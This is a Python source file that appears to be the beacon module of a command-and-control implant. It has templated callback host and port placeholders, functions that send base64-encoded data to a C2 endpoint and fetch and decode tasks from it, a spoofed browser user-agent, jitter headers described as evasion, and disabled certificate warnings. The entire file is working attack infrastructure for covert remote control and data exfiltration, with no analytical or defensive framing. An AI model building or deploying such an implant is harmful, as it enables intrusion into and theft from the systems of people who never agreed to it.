import requests
import json
import time
import base64
import random
import ssl

# C2 Configuration (will be replaced during build)
C2_SERVER = "{{CALLBACK_HOST}}"
C2_PORT = "{{CALLBACK_PORT}}"
USE_SSL = False
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"

# Construct the base URL
if USE_SSL:
    BASE_URL = f"https://{C2_SERVER}:{C2_PORT}"
else:
    BASE_URL = f"http://{C2_SERVER}:{C2_PORT}"

def send_data(data):
    """Send data to the C2 server."""
    try:
        # Prepare the data
        encoded_data = base64.b64encode(json.dumps(data).encode()).decode()
        
        # Prepare headers with jitter for evasion
        headers = {
            "User-Agent": USER_AGENT,
            "Content-Type": "application/json",
            "X-Timestamp": str(int(time.time())),
            "X-Jitter": str(random.randint(1000, 9999))
        }
        
        # Send the request
        response = requests.post(
            f"{BASE_URL}/api/v1/agent/data",
            json={"data": encoded_data},
            headers=headers,
            verify=False if USE_SSL else None,
            timeout=30
        )
        
        # Process the response
        if response.status_code == 200:
            try:
                return json.loads(response.text)
            except:
                return {"status": "error", "message": "Invalid response format"}
        else:
            return {"status": "error", "message": f"HTTP error: {response.status_code}"}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}

def get_tasks(agent_id):
    """Get pending tasks from the C2 server."""
    try:
        # Prepare headers with jitter
        headers = {
            "User-Agent": USER_AGENT,
            "X-Agent-ID": agent_id,
            "X-Timestamp": str(int(time.time())),
            "X-Jitter": str(random.randint(1000, 9999))
        }
        
        # Send the request
        response = requests.get(
            f"{BASE_URL}/api/v1/agent/tasks",
            headers=headers,
            verify=False if USE_SSL else None,
            timeout=30
        )
        
        # Process the response
        if response.status_code == 200:
            try:
                data = json.loads(response.text)
                # Decode any encoded task data
                if "tasks" in data and data["tasks"]:
                    for task in data["tasks"]:
                        if "encoded_data" in task:
                            decoded = json.loads(base64.b64decode(task["encoded_data"]).decode())
                            task.update(decoded)
                            del task["encoded_data"]
                return data
            except:
                return {"status": "error", "message": "Invalid task format"}
        else:
            return {"status": "error", "message": f"HTTP error: {response.status_code}"}
    
    except Exception as e:
        return {"status": "error", "message": str(e)}

# Disable SSL warnings if using SSL without verification
if USE_SSL:
    try:
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    except:
        pass